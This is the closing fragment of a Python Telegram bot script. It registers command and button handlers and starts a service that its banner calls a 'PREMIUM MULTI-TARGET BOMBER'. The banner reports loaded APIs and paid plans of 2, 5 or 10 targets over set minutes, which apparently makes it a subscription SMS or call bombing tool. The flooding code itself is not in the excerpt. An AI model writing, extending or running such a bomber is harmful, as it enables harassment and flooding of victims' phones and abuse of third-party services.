    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("account", account_command))
    app.add_handler(CommandHandler("plan", plan_command))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CommandHandler("protect", protect_command))
    app.add_handler(CommandHandler("unprotect", unprotect_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("cancel", cancel_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_msg))
    app.add_handler(CallbackQueryHandler(btn_handler))
    print("=" * 50)
    print("🔥 PREMIUM MULTI-TARGET BOMBER Started (FIXED)")
    print(f"📊 Loaded {len(APIS)} APIs")
    print("🎯 Plans: Standard(2 targets/300min) | Premium(5 targets/720min) | Ultimate(10 targets/720min)")
    print("👑 Admin Panel: 3 Quick Key Buttons + Custom Option")
    print("=" * 50)
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.create_task(web_server())
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()